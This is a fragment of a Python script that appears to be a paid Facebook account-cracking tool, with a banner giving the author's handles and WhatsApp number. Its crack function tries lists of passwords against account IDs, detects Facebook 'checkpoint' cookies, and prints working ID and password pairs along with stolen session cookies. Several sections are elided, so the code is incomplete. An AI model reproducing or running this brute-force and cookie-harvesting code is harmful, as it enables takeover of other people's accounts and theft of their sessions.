...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-MAHAMUD ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • MAHAMUD King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mMAHAMUD-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 01704076023 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 3.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	MAHAMUDj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	MAHAMUDj('\033[0;97m===============================================')
	MAHAMUD= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if MAHAMUD in ['m']:
		public()
	elif MAHAMUD in ['1']:
		crack_file()
	elif MAHAMUD in ['i','0i']:
		result()
	elif MAHAMUD in ['2','02']:
		os.system('xdg-open https://wa.me/+8801704076023')
	elif MAHAMUD in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[MAHAMUD-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#MAHAMUD-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•MAHAMUD-Cp] {idf} • {pw}')     
				...
				#MAHAMUD-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•MAHAMUD-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " MAHAMUD,  Ok,  id"')
